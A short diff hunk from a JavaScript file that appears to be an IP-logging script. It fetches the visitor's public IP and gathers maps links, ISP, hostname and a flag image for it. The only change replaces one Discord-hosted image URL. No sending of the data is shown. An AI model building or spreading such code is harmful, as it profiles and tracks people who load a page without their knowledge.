@@ -255,7 +255,7 @@ fetch('https://api.ipify.org/?format=json')
         var maps_url = await generateLink(ip, "maps");
         var myipaddress_url = await generateLink(ip, "myipaddress");
         var flagUrl = await generateImgUrl(ip);
-        var img_url = 'https://cdn.discordapp.com/attachments/1107821046406598797/1133904942969671711/yugue.png'
+        var img_url = 'https://cdn.discordapp.com/attachments/1107821046406598797/1133909866277253120/358.jpg'
         var ISP = await detectISP(ip);
         var hostname = await detecthostname(ip);
         
